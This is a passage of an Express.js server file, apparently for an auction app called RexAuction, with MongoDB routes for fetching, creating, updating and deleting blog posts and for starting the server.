            .json({ message: "No blogs found for this email." });
        }

        res.status(200).json(blogs); // Respond with the blogs
      } catch (error) {
        console.error(error);
        res
          .status(500)
          .json({ message: "Server error, please try again later." });
      }
    });

    app.get("/blog/:id", async (req, res) => {
      const { id } = req.params;
      try {
        const blog = await blogCollection.findOne({ _id: new ObjectId(id) });
        if (!blog) {
          return res.status(404).json({ message: "Blog not found" });
        }
        res.json(blog);
      } catch (error) {
        res.status(500).json({ message: "Error fetching blog" });
      }
    });

    app.post("/addBlogs", async (req, res) => {
      try {
        const { title, imageUrls, fullContent } = req.body;

        if (!title || !imageUrls.length || !fullContent) {
          return res.status(400).json({ message: "All fields are required." });
        }
        const blog = req.body;

        const newBlog = {
          ...blog,
          createdAt: new Date(),
        };

        const result = await blogCollection.insertOne(newBlog);

        if (result.insertedId) {
          res.status(201).json({
            message: "Blog created successfully",
            blogId: result.insertedId,
          });
        } else {
          res.status(500).json({ message: "Failed to create blog." });
        }
      } catch (error) {
        console.error("Error in /add-blogs:", error);
        res.status(500).json({ message: "Internal Server Error" });
      }
    });

    // Ensure that the route matches the one you're calling in the frontend

    app.patch("/updateBlog/:id", async (req, res) => {
      const { id } = req.params;
      const { title, fullContent, imageUrls } = req.body;

      try {
        const result = await blogCollection.updateOne(
          { _id: new ObjectId(id) }, // match document by id
          {
            $set: {
              title,
              fullContent,
              imageUrls: imageUrls || [],
            },
          }
        );

        if (result.matchedCount === 0) {
          return res
            .status(404)
            .json({ success: false, message: "Blog not found" });
        }

        res.json({ success: true, message: "Blog updated successfully" });
      } catch (error) {
        console.error("Error updating blog:", error);
        res.status(500).json({
          success: false,
          message: "Server Error",
          error: error.message,
        });
      }
    });

    app.delete("/delete/:id", async (req, res) => {
      const { id } = req.params; // Extract the blog post ID from the URL parameter

      try {
        // Attempt to delete the blog post by its ID from the database
        const result = await blogCollection.deleteOne({
          _id: new ObjectId(id),
        });

        // Check if the blog post was found and deleted
        if (result.deletedCount === 0) {
          return res.status(404).json({ message: "Blog post not found." });
        }

        // Respond with a success message if the deletion is successful
        res.status(200).json({ message: "Blog post deleted successfully." });
      } catch (error) {
        console.error("Error deleting blog post:", error);
        res.status(500).json({ message: "Internal Server Error" });
      }
    });
  } finally {
  }
}
run().catch(console.dir);

app.get("/", (req, res) => {
  res.send("RexAuction Running with Socket.IO!");
});

server.listen(port, () => {
  console.log(`Running on port ${port}`);
});
